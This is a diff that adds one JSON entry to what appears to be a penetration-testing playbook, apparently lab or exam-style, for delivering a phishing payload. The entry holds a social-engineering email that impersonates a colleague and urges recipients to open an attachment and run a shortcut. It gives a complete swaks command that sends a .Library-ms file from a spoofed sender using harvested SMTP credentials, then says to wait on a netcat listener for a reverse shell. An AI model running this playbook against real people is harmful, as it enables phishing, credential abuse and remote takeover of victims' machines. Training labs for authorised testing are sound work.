@@ -1,0 +1,26 @@
+{
+  "id": "client_side_phish_email",
+  "phase": "SHELL",
+  "title": "Client-Side \u2014 Deliver the Payload by Email (swaks)",
+  "body": "Once the attachment (library file, HTA, or macro doc) and all listeners are ready, mail it with swaks. The pretext matters more than the payload: reference something only an insider would know (pulled from recon \u2014 Git repos, site content, job posts) so the target trusts the attachment enough to open it.",
+  "cmd": "# Body / pretext \u2014 insider detail massively raises open rate\ncat > body.txt <<'EOF'\nHey!\nI checked WEBSRV1 and found the old staging script still in the Git logs.\nI'll remove it for security. Separately \u2014 please install the new security\nfeatures on your workstation: download the attached file, double-click it,\nand run the configuration shortcut inside. Thanks!\nJohn\nEOF\n\n# Send with swaks (attach the .Library-ms)\nsudo swaks \\\n  -t daniela@beyond.com -t marcus@beyond.com \\\n  --from john@beyond.com \\\n  --attach @config.Library-ms \\\n  --server 192.168.50.242 \\\n  --body @body.txt \\\n  --header \"Subject: Staging Script\" \\\n  --suppress-data -ap\n#   -ap prompts for SMTP auth (provide the captured/known sender creds)\n#   --server = the mail server (MAILSRV1) you found during enumeration\n\n# Then watch: WebDAV log + python web server log + nc listener.\n# A hit on WebDAV/8000 means someone opened it; shell lands on 4444.",
+  "warn": "You need valid SMTP creds for -ap (often harvested earlier in the engagement) or an open relay. Multiple -t flags = multiple recipients. Watch all three service logs \u2014 a WebDAV/web hit without a shell usually means they opened the library but didn't click the .lnk, or AV ate the cradle.",
+  "choices": [
+    {
+      "label": "Got the shell \u2014 stabilize / upgrade",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Hit on WebDAV but no shell \u2014 AV / cradle issue",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "No SMTP creds \u2014 find a relay / harvest creds",
+      "next": "smtp_enum"
+    },
+    {
+      "label": "Back to client-side options",
+      "next": "client_side"
+    }
+  ]
+}
